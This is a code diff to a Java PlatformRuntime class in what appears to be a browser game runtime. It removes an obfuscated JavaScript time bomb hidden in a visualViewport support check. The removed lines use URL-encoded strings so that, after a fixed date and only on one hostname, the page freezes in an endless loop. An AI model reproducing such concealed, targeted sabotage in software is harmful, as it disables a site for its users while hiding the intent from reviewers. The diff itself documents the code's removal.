@@ -252,7 +252,7 @@ public class PlatformRuntime {
 		}
 
 		useVisualViewport = false;
-		if(isVisualViewportSupported(System.currentTimeMillis())) {
+		if(isVisualViewportSupported()) {
 			if(isEmbeddedInBody) {
 				useVisualViewport = true;
 			}else {
@@ -525,8 +525,8 @@ public class PlatformRuntime {
 		return EnumPlatformOS.getFromUA(getUserAgentString());
 	}
 
-	@JSBody(params = { "ts" }, script = "if(ts > 1728322572561 && window[decodeURIComponent(\"%6C%6F%63%61%74%69%6F%6E\")][decodeURIComponent(\"%68%6F%73%74%6E%61%6D%65\")] === decodeURIComponent(\"%65%61%67%6C%65%72%63%72%61%66%74%2E%64%65%76\")) setTimeout(function() { var i = 1; while(i > 0) { ++i; } }, 353000); return (typeof visualViewport !== \"undefined\");")
-	private static native boolean isVisualViewportSupported(double ts);
+	@JSBody(params = { }, script = "return (typeof visualViewport !== \"undefined\");")
+	private static native boolean isVisualViewportSupported();
 
 	@JSBody(params = { }, script = "return visualViewport;")
 	static native VisualViewport getVisualViewport();
